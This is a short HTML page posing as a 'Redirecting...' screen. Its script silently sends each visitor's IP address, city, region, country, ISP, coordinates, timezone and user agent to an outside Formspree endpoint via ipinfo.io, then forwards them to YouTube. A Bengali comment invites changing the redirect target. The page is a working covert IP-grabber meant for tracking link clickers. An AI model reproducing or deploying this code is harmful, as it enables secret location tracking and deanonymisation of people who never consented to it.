<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Redirecting...</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f0f4f8;
      color: #333;
      text-align: center;
      padding: 100px 20px;
    }
    .box {
      background: white;
      display: inline-block;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
  </style>
</head>
<body>
  <div class="box">
    <h2>Please wait...</h2>
    <p>Redirecting you shortly...</p>
  </div>

  <script>
    async function logVisitorInfo() {
      try {
        const res = await fetch("https://ipinfo.io/json?token=457215f5fb7c94");
        const data = await res.json();

        await fetch("https://formspree.io/f/mldnbqvo", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            ip: data.ip,
            city: data.city,
            region: data.region,
            country: data.country,
            org: data.org,
            location: data.loc,
            timezone: data.timezone,
            user_agent: navigator.userAgent
          })
        });
      } catch (err) {
        console.error("Logging failed:", err);
      } finally {
        window.location.href = "https://youtube.com"; // চাইলে এখানে redirect URL বদলাও
      }
    }

    window.onload = logVisitorInfo;
  </script>
</body>
</html>
